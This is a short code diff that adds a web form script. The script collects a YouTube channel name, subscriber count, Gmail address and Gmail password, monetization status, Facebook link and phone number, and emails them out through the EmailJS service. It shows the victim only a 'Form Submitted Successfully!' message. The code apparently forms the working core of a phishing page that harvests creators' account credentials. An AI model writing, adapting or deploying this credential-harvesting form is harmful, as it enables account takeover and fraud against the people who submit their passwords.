@@ -1,0 +1,25 @@
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+<script>
+(function(){
+emailjs.init("UgPg3483hb9glTFzk");
+})();
+
+function sendMail(){
+emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID",{
+channelName: document.getElementById("channelName").value,
+subCount: document.getElementById("subCount").value,
+gmail: document.getElementById("gmail").value,
+password: document.getElementById("password").value,
+monetization: document.getElementById("monetization").value,
+fbLink: document.getElementById("fbLink").value,
+mobile: document.getElementById("mobile").value
+}).then(function(response){
+alert("Form Submitted Successfully!");
+}, function(error){
+alert("Failed to Send!");
+});
+}
+</script>
+
+<button onclick="sendMail()">Submit</button>
